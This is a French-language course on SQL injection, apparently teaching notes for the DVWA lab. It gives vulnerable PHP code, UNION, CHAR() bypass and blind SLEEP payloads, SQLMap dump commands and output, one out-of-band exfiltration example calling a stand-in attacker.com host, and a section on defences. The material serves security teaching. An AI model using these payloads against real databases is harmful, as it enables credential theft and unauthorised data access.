# Cours : SQL Injection (SQLi) - Exploitation DVWA et SQLMap

## Introduction

Cette section couvre :
- **SQL Injection** : Empoisonnement de requêtes DB avec input utilisateur [lwn](https://lwn.net/Articles/176749/)
- **DVWA SQLi Low** : Exploitation basique `' OR 1=1; --` [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)
- **DVWA SQLi Medium** : Bypass `mysqli_real_escape_string()` [youtube](https://www.youtube.com/watch?v=IzT7BKf4tQ8)
- **SQLMap** : Automatisation d'attaques SQLi [github](https://github.com/sqlmapproject/sqlmap/issues/2498)
- **SQL Blind Injection** : Time-based et Boolean-based [blog.qualys](https://blog.qualys.com/product-tech/2023/02/09/blind-sql-injection-content-based-time-based-approaches)

***

## Partie 1 : SQL Injection - Concepts fondamentaux

### 1.1 Définition

**SQL Injection (SQLi)** : Technique d'injection de code permettant à un attaquant d'**insérer du code SQL malveillant** dans des champs de saisie utilisateur, permettant de lire, modifier, ou supprimer des données dans une base de données. [w3schools](https://www.w3schools.com/sql/sql_injection.asp)

**OWASP Top 10 2021** : **A03:2021 – Injection** (3ème position, fusion de SQLi, XSS, Command Injection).

**Impact**  : [lwn](https://lwn.net/Articles/176749/)
- 🔴 **Authentification bypassée** : Login sans mot de passe
- 🔴 **Lecture de données sensibles** : Dump de toutes les tables
- 🔴 **Modification/suppression** : UPDATE, DELETE, DROP TABLE
- 🔴 **Escalade de privilèges** : Accès admin, exécution de commandes OS

### 1.2 Principe de fonctionnement

**Code vulnérable**  : [w3schools](https://www.w3schools.com/sql/sql_injection.asp)

```php
<?php
// Récupérer input utilisateur
$username = $_POST['username'];
$password = $_POST['password'];

// Construire requête SQL (VULNÉRABLE)
$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";

// Exécuter
$result = mysqli_query($conn, $query);

// Si résultat → Authentifié
if (mysqli_num_rows($result) > 0) {
    echo "Login successful!";
} else {
    echo "Invalid credentials.";
}
?>
```

**Utilisation légitime** :

```
Input:
username: john
password: secret123

Requête générée:
SELECT * FROM users WHERE username='john' AND password='secret123'

Résultat: Authentifié si credentials corrects
```

**Exploitation malveillante**  : [lwn](https://lwn.net/Articles/176749/)

```
Input:
username: admin' OR 1=1; --
password: [anything]

Requête générée:
SELECT * FROM users WHERE username='admin' OR 1=1; -- ' AND password='...'

Explication:
- admin' : Ferme la quote du username
- OR 1=1 : Condition toujours vraie
- ; : Fin de requête (optionnel selon DBMS)
- -- : Commentaire SQL (ignore le reste)
- [espace] : IMPORTANT après --

Résultat: Toutes les lignes retournées → Authentifié comme premier user (souvent admin) !
```

### 1.3 Types d'injection SQL

| Type | Description | Exemple |
|------|-------------|---------|
| **In-band SQLi** | Résultat affiché directement | UNION SELECT |
| **Blind SQLi** | Pas de résultat visible | Boolean-based, Time-based |
| **Out-of-band SQLi** | Données exfiltrées via DNS/HTTP | `LOAD_FILE('\\attacker.com\a')` |

***

## Partie 2 : DVWA SQL Injection - Low Security

### 2.1 Configuration

```
1. DVWA → DVWA Security → Low
2. SQL Injection
```

**Interface** :

```
┌─────────────────────────────────────┐
│  User ID:                           │
│  [________] [Submit]                │
└─────────────────────────────────────┘
```

### 2.2 Code vulnérable (Low)

**Code PHP**  : [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)

```php
<?php
if (isset($_GET['id'])) {
    $id = $_GET['id'];

    // Requête SANS validation
    $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
    
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    
    while ($row = mysqli_fetch_assoc($result)) {
        echo "<div>{$row['first_name']} {$row['last_name']}</div>";
    }
}
?>
```

**⚠️ Vulnérabilité** : `$id` directement injecté dans la requête sans échappement.

### 2.3 Test légitime

**Input** :
```
User ID: 1
```

**URL** :
```
http://servertcm:8001/vulnerabilities/sqli/?id=1&Submit=Submit
```

**Requête SQL générée** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'
```

**Résultat** :
```
First name: admin
Surname: admin
```

### 2.4 Exploitation : Test d'injection

**Test 1 : Simple quote** [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)

```
Input: 1'
```

**Requête** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1''
```

**Résultat** :
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

**✅ Confirmation** : Site vulnérable à SQLi !

**Test 2 : OR 1=1** [w3schools](https://www.w3schools.com/sql/sql_injection.asp)

**⚠️ Important** : Sur le système, utiliser **apostrophe `'`** au lieu de guillemets `"`.

**Input** :
```
1' OR 1=1; --[ESPACE]
```

**Requête SQL générée**  : [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1; -- ' AND ...
```

**Explication détaillée** :

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1; -- '

1. user_id = '1'          → Ferme la quote, recherche user_id=1
2. OR 1=1                 → Condition TOUJOURS VRAIE
3. ;                      → Fin de requête (optionnel)
4. --[ESPACE]             → Commentaire SQL (ignore le reste de la requête)
```

**Résultat** :
```
First name: admin
Surname: admin

First name: Gordon
Surname: Brown

First name: Hack
Surname: Me

First name: Pablo
Surname: Picasso

First name: Bob
Surname: Smith
```

**Succès** : Toute la table `users` affichée ! ✅

### 2.5 Exploitation : UNION SELECT

**Objectif** : Extraire des données d'autres tables. [lwn](https://lwn.net/Articles/176749/)

**Étape 1 : Déterminer le nombre de colonnes**

**Payload** :
```
1' ORDER BY 1 --[ESPACE]
1' ORDER BY 2 --[ESPACE]
1' ORDER BY 3 --[ESPACE]
```

**Résultats** :
- `ORDER BY 1` : ✅ OK
- `ORDER BY 2` : ✅ OK
- `ORDER BY 3` : ❌ **Erreur** : `Unknown column '3' in 'order clause'`

**Conclusion** : La requête a **2 colonnes**.

**Étape 2 : UNION SELECT**

**Payload** :
```
1' UNION SELECT 1, 2 --[ESPACE]
```

**Requête** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' 
UNION SELECT 1, 2 -- '
```

**Résultat** :
```
First name: admin
Surname: admin

First name: 1
Surname: 2
```

**✅ Validation** : UNION fonctionne, colonnes 1 et 2 affichées.

**Étape 3 : Extraire noms de bases de données**

**Payload** :
```
1' UNION SELECT 1, schema_name FROM information_schema.schemata --[ESPACE]
```

**Résultat** :
```
information_schema
dvwa
mysql
performance_schema
```

**Étape 4 : Extraire tables de la DB `dvwa`**

**Payload** :
```
1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' --[ESPACE]
```

**Résultat** :
```
guestbook
users
```

**Étape 5 : Extraire colonnes de la table `users`**

**Payload** :
```
1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --[ESPACE]
```

**Résultat** :
```
user_id
first_name
last_name
user
password
avatar
last_login
failed_login
```

**Étape 6 : Dump username + password**

**Payload** :
```
1' UNION SELECT user, password FROM users --[ESPACE]
```

**Résultat** :
```
admin | 5f4dcc3b5aa765d61d8327deb882cf99
gordonb | e99a18c428cb38d5f260853678922e03
1337 | 8d3533d75ae2c3966d7e0d4fcc69216b
pablo | 0d107d09f5bbe40cade3de5c71e9e9b7
smithy | 5f4dcc3b5aa765d61d8327deb882cf99
```

**Succès** : Hashes MD5 des mots de passe extraits ! 🔴

***

## Partie 3 : DVWA SQL Injection - Medium Security

### 3.1 Configuration

```
1. DVWA Security → Medium
2. SQL Injection
```

**Interface modifiée** :

```
┌─────────────────────────────────────┐
│  User ID:                           │
│  [1 ▼] [Submit]                     │
│  (Dropdown au lieu de text input)   │
└─────────────────────────────────────┘
```

### 3.2 Code source (Medium)

**Code PHP**  : [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)

```php
<?php
if (isset($_POST['id'])) {
    // Protection : mysqli_real_escape_string()
    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);

    $query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
    
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    
    while ($row = mysqli_fetch_assoc($result)) {
        echo "<div>{$row['first_name']} {$row['last_name']}</div>";
    }
}
?>
```

**Changements**  : [youtube](https://www.youtube.com/watch?v=IzT7BKf4tQ8)
1. **Méthode POST** : Au lieu de GET
2. **`mysqli_real_escape_string()`** : Échappe les quotes `'` et `"`
3. **Pas de quotes autour de `$id`** : `WHERE user_id = $id` (au lieu de `'$id'`)

**Impact de `mysqli_real_escape_string()`**  : [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)

```php
Input: 1' OR 1=1; --
Après échappement: 1\' OR 1=1; --

Requête générée:
SELECT first_name, last_name FROM users WHERE user_id = 1\' OR 1=1; -- 
→ Erreur de syntaxe
```

### 3.3 Test d'exploitation (échoue avec quotes)

**Via ZAP** :

```
1. ZAP History → Sélectionner POST /vulnerabilities/sqli/
2. Clic droit → Open/Resend with Request Editor
3. Modifier body : id=1' OR 1=1; --
4. Send
```

**Résultat** :
```
You have an error in your SQL syntax
```

**Échec** : `mysqli_real_escape_string()` échappe les quotes ❌

### 3.4 Bypass : Injection sans quotes [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)

**Observation clé** : La requête n'utilise **pas de quotes** autour de `$id`. [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)

```sql
WHERE user_id = $id  ← Pas de quotes !
```

**Stratégie** : Utiliser payloads **numériques** (sans quotes). [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)

**Payload** :
```
1 UNION SELECT 1, 2
```

**Requête générée** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT 1, 2
```

**Résultat** :
```
First name: admin
Surname: admin

First name: 1
Surname: 2
```

**✅ Bypass réussi** : Pas besoin de quotes ! [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)

### 3.5 Exploitation complète (Medium)

**Dump databases** :
```
1 UNION SELECT 1, schema_name FROM information_schema.schemata
```

**Dump tables (avec CHAR pour contourner quote)**  : [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)

**Problème** : `table_schema='dvwa'` nécessite des quotes.

**Solution** : Fonction `CHAR()`  : [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)

```
d = ASCII 100
v = ASCII 118
w = ASCII 119
a = ASCII 97
```

**Payload** :
```
1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=CHAR(100,118,119,97)
```

**Résultat** :
```
guestbook
users
```

**Dump colonnes** :
```
1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_schema=CHAR(100,118,119,97) AND table_name=CHAR(117,115,101,114,115)
```

**Dump credentials** :
```
1 UNION SELECT user, password FROM users
```

**Succès** : Même résultat que Low, protection bypassée ! ✅

### 3.6 Fuzzing avec ZAP (tentative)

**Workflow** :

```
1. ZAP → History → POST request
2. Clic droit → Fuzz...
3. Highlight "id=1" dans body
4. Add... → Type: File Fuzzers
5. Sélectionner : fuzzdb → attack → sql-injection → detect → MySQL.txt
6. Start Fuzzer
```

**Résultat** : Fuzzing basique **échoue** (payloads contiennent des quotes).

### 3.7 Active Scan ZAP (ciblé)

**Configuration** :

```
1. ZAP → History → POST request
2. Clic droit → Active Scan...
3. Show advanced options
4. Policy → Apply 'OFF' threshold to all rules
5. Injection → SQL Injection → Threshold: Medium
6. Start Scan
```

**Résultat** : Scan détecte la vulnérabilité mais peut prendre du temps.

***

## Partie 4 : SQLMap - Automatisation de l'exploitation

### 4.1 Préparation : Sauvegarder la requête

**Depuis ZAP** :

```
1. History → POST /vulnerabilities/sqli/
2. Clic droit → Save Raw → Request → ALL
3. Enregistrer : ~/Documents/sqli_request.raw
```

**Contenu du fichier** :

```http
POST /vulnerabilities/sqli/ HTTP/1.1
Host: servertcm:8001
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Cookie: PHPSESSID=abc123; security=medium

id=1&Submit=Submit
```

### 4.2 Lancement SQLMap

**Commande de base** :

```bash
sqlmap -r ~/Documents/sqli_request.raw --dbms mysql
```

**Paramètres** :
- `-r` : Fichier de requête HTTP brute
- `--dbms mysql` : Spécifier le DBMS (accélère les tests)

**Résultat**  : [github](https://github.com/sqlmapproject/sqlmap/issues/2498)

```
[05:46:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:46:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:46:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:46:08] [INFO] target URL appears to have 2 columns in query
[05:46:08] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
```

**Explication**  : [github](https://github.com/sqlmapproject/sqlmap/issues/2519)
- **UNION query (NULL)** : SQLMap a testé `UNION SELECT NULL, NULL` et ça a fonctionné
- **1 to 20 columns** : SQLMap teste de 1 à 20 colonnes automatiquement
- **Generic** : Fonctionne sans méthodes d'échappement spécifiques au DBMS [github](https://github.com/sqlmapproject/sqlmap/issues/2519)

### 4.3 Test manuel de UNION

**Basé sur résultat sqlmap** :

```
Input: 1 UNION SELECT NULL, NULL
```

**Requête** :
```sql
SELECT first_name, last_name FROM users WHERE user_id = 1 UNION SELECT NULL, NULL
```

**Résultat** :
```
First name: admin
Surname: admin

First name: 
Surname: 
```

**✅ Validation** : UNION fonctionne.

### 4.4 Dump complet avec SQLMap

**Commande** :

```bash
sqlmap -r ~/Documents/sqli_request.raw --dbms mysql --dump --dbs
```

**Paramètres** :
- `--dump` : Dump les données des tables
- `--dbs` : Lister les bases de données

**Résultat** :

```
available databases  [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf):
[*] information_schema
[*] dvwa
[*] mysql
[*] performance_schema
[*] sys

do you want to crack them via a dictionary-based attack? [Y/n/q] n
```

**SQLMap demande** : Voulez-vous cracker les hashes ? → **Non** (pour accélérer).

**Tables dumpées** :

```
Database: dvwa
Table: users
[5 entries]
+---------+------------+-----------+----------------------------------+
| user_id | user       | first_name | password                        |
+---------+------------+-----------+----------------------------------+
| 1       | admin      | admin     | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2       | gordonb    | Gordon    | e99a18c428cb38d5f260853678922e03 |
| 3       | 1337       | Hack      | 8d3533d75ae2c3966d7e0d4fcc69216b |
| 4       | pablo      | Pablo     | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 5       | smithy     | Bob       | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+------------+-----------+----------------------------------+
```

**Succès** : Dump complet automatisé ! 🎯

***

## Partie 5 : SQL Blind Injection

### 5.1 Définition

**Blind SQL Injection** : Type de SQLi où l'application **ne retourne pas de résultats visibles**, mais peut être exploitée en observant le **comportement** de l'application. [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

**Types**  : [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
1. **Boolean-based** : Vrai/Faux basé sur le contenu de la réponse
2. **Time-based** : Délai dans la réponse basé sur une condition

### 5.2 DVWA SQL Injection (Blind) - Configuration

```
1. DVWA → SQL Injection (Blind)
2. Security: Low ou Medium
```

**Interface** :

```
┌─────────────────────────────────────┐
│  User ID: [________] [Submit]       │
│                                     │
│  (Pas de résultat affiché,          │
│   seulement "User ID exists" ou     │
│   "User ID is MISSING")             │
└─────────────────────────────────────┘
```

### 5.3 Boolean-based Blind SQLi

**Principe**  : Injecter une condition **vraie ou fausse** et observer la réponse. [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

**Payload pour déterminer nombre de colonnes**  : [stackoverflow](https://stackoverflow.com/questions/21678885/what-is-the-use-of-order-by-in-sql-injection)

```
1' ORDER BY 1 --[ESPACE]
1' ORDER BY 2 --[ESPACE]
1' ORDER BY 3 --[ESPACE]
...
1' ORDER BY X --[ESPACE]
```

**Logique**  : [stackoverflow](https://stackoverflow.com/questions/21678885/what-is-the-use-of-order-by-in-sql-injection)
- Incrémenter `X` jusqu'à obtenir une **erreur**
- Si `ORDER BY 5` → OK, `ORDER BY 6` → Erreur → **5 colonnes**

**Exemple** :

```
Input: 1' ORDER BY 1 --[ESPACE]
Réponse: User ID exists

Input: 1' ORDER BY 2 --[ESPACE]
Réponse: User ID exists

Input: 1' ORDER BY 3 --[ESPACE]
Réponse: User ID is MISSING
```

**Conclusion** : **2 colonnes** dans la requête.

**Extraction de données caractère par caractère**  : [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

```sql
-- Test si premier caractère du username est 'a'
1' AND SUBSTRING((SELECT user FROM users LIMIT 1), 1, 1) = 'a' --[ESPACE]

-- Si "User ID exists" → Premier caractère est 'a'
-- Sinon → Essayer 'b', 'c', etc.
```

### 5.4 Time-based Blind SQLi

**Principe**  : Injecter une requête qui provoque un **délai** si une condition est vraie. [blog.qualys](https://blog.qualys.com/product-tech/2023/02/09/blind-sql-injection-content-based-time-based-approaches)

**Fonction SQL** : `SLEEP()` (MySQL). [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)

**Payload de base**  : [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)

```sql
1' AND SLEEP(5) --[ESPACE]
```

**Comportement** :
- Si vulnérable → Réponse après **5 secondes**
- Si non vulnérable → Réponse immédiate

**Extraction de données**  : [owasp](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

```sql
-- Test si premier caractère du username est 'a'
1' AND IF(SUBSTRING((SELECT user FROM users LIMIT 1), 1, 1) = 'a', SLEEP(5), 0) --[ESPACE]

-- Si délai de 5 secondes → Premier caractère est 'a'
-- Sinon → Essayer 'b', 'c', etc.
```

### 5.5 SQLMap Blind Injection

**Sauvegarder requête GET (Blind)** :

```
1. ZAP → SQL Injection (Blind)
2. Soumettre : User ID = 1
3. History → GET request
4. Save Raw → Request → Headers Only
5. Enregistrer : ~/Documents/blind_header.raw
```

**Contenu** :

```http
GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
Host: servertcm:8001
Cookie: PHPSESSID=abc123; security=low
```

**Lancement SQLMap** :

```bash
sqlmap -r ~/Documents/blind_header.raw --dbms mysql
```

**Résultat**  : [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)

```
[07:08:40] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)

[07:08:50] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

**Explication** :

1. **Boolean-based blind**  : [blog.qualys](https://blog.qualys.com/product-tech/2023/02/09/blind-sql-injection-content-based-time-based-approaches)
   - SQLMap teste : `id=1 AND 1=1` → Code 200 (User exists)
   - SQLMap teste : `id=1 AND 1=2` → Code différent (User MISSING)
   - → Injection confirmée

2. **Time-based blind**  : [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)
   - SQLMap teste : `id=1 AND SLEEP(5)` → Délai de 5 secondes
   - → Injection confirmée

**Payload Time-based**  : [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)

```sql
GET parameter 'id':
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
```

**Avantage** : Fonctionne même si **aucun résultat** n'est affiché.

***

## Partie 6 : Protections contre SQL Injection

### 6.1 Prepared Statements (Recommandé) [people.csail.mit](https://people.csail.mit.edu/alinush/cse409-fall-2011/11-web-security.pdf)

**PHP (PDO)**  : [lwn](https://lwn.net/Articles/176749/)

```php
<?php
// Préparer la requête avec placeholders
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");

// Bind et exécuter
$stmt->execute([$username, $password]);

// Résultat
$user = $stmt->fetch();
?>
```

**Avantage**  : [people.csail.mit](https://people.csail.mit.edu/alinush/cse409-fall-2011/11-web-security.pdf)
- ✅ Paramètres traités comme **données**, jamais comme **code SQL**
- ✅ Protection automatique contre toutes les injections
- ✅ Portable entre DBMS

**Exemple injection bloquée**  : [lwn](https://lwn.net/Articles/176749/)

```php
Input: username = admin' OR 1=1; --
Requête: SELECT * FROM users WHERE username = 'admin\' OR 1=1; -- ' AND password = '...'
→ Cherche littéralement username "admin' OR 1=1; --" (qui n'existe pas)
```

### 6.2 ORM (Object-Relational Mapping)

**Exemple Doctrine (PHP)** :

```php
$user = $entityManager->getRepository(User::class)->findOneBy([
    'username' => $username,
    'password' => $password
]);
```

**Exemple SQLAlchemy (Python)** :

```python
user = session.query(User).filter_by(username=username, password=password).first()
```

**Avantage** : ORM génère automatiquement des requêtes préparées.

### 6.3 Validation stricte des inputs

**Whitelist** :

```php
// ID doit être numérique
if (!is_numeric($id)) {
    die("Invalid ID");
}

// Email doit être valide
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    die("Invalid email");
}
```

### 6.4 Principe du moindre privilège

**MySQL** :

```sql
-- Mauvais : Compte app avec tous les droits
GRANT ALL PRIVILEGES ON *.* TO 'webapp'@'localhost';

-- Bon : Compte avec droits minimaux
GRANT SELECT, INSERT, UPDATE ON dvwa.users TO 'webapp'@'localhost';
-- Pas de DROP, DELETE, FILE, etc.
```

**Impact** : Même si SQLi réussit, l'attaquant ne peut pas `DROP TABLE` ou lire `/etc/passwd`.

### 6.5 WAF (Web Application Firewall)

**ModSecurity (Apache)** :

```apache
SecRule ARGS "@detectSQLi" \
    "id:1000,phase:2,deny,status:403,msg:'SQL Injection detected'"
```

**Cloudflare WAF** : Règles managées anti-SQLi.

***

## Résumé : Points clés à retenir

1. **SQL Injection** : Empoisonnement requêtes DB avec input malveillant [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
2. **DVWA Low** : `' OR 1=1; --` bypass authentification [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)
3. **Espace après `--`** : OBLIGATOIRE pour commentaire SQL [w3schools](https://www.w3schools.com/sql/sql_injection.asp)
4. **UNION SELECT** : Extraction de données d'autres tables [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-sqli/)
5. **ORDER BY** : Déterminer nombre de colonnes [stackoverflow](https://stackoverflow.com/questions/21678885/what-is-the-use-of-order-by-in-sql-injection)
6. **DVWA Medium** : `mysqli_real_escape_string()` échappe quotes [youtube](https://www.youtube.com/watch?v=IzT7BKf4tQ8)
7. **Bypass Medium** : Injection numérique sans quotes `1 UNION SELECT 1,2` [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/11.1%20SQL%20Injection%20DVWA%20%20Medium%20-%20High.pdf)
8. **CHAR()** : Contourner quotes `table_schema=CHAR(100,118,119,97)` (dvwa) [sharpforce.gitbook](https://sharpforce.gitbook.io/cybersecurity/walkthroughs/deliberately-vulnerable/damn-vulnerable-web-application-dvwa/sql-injection/niveau-medium)
9. **SQLMap** : `-r request.raw --dbms mysql --dump --dbs` [github](https://github.com/sqlmapproject/sqlmap/issues/2498)
10. **UNION query (NULL)** : SQLMap teste `UNION SELECT NULL, NULL, ...` [github](https://github.com/sqlmapproject/sqlmap/issues/2519)
11. **Blind SQLi** : Boolean-based (vrai/faux) et Time-based (SLEEP) [blog.qualys](https://blog.qualys.com/product-tech/2023/02/09/blind-sql-injection-content-based-time-based-approaches)
12. **ORDER BY X** : Incrémenter jusqu'à erreur pour compter colonnes [stackoverflow](https://stackoverflow.com/questions/21678885/what-is-the-use-of-order-by-in-sql-injection)
13. **SLEEP(5)** : Délai de 5s si condition vraie (Time-based) [pentest.co](https://pentest.co.uk/labs/time-based-blind-sql-injection-soplanning/)
14. **Protection** : Prepared statements avec placeholders `?` [people.csail.mit](https://people.csail.mit.edu/alinush/cse409-fall-2011/11-web-security.pdf)
15. **Least Privilege** : Compte DB avec droits minimaux (pas DROP, FILE)
